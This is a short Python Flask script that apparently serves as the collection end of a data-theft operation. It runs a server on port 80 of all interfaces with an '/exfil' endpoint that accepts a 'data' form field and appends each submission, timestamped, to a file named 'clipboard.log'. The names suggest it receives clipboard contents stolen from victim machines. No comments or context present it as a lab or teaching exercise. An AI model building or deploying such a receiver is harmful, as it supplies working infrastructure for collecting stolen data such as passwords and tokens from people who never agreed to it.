from flask import Flask, request
from datetime import datetime
import os

app = Flask(__name__)
log_file = "clipboard.log"

@app.route("/exfil", methods=["POST"])
def exfil():
    data = request.form.get("data", "").strip()
    if not data:
        return "Missing data", 400

    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    log_entry = f"{timestamp} {data}\n"

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(log_entry)

    print(log_entry, end="")
    return "OK", 200

if __name__ == "__main__":
    os.makedirs(os.path.dirname(log_file) or ".", exist_ok=True)
    app.run(host="0.0.0.0", port=80)
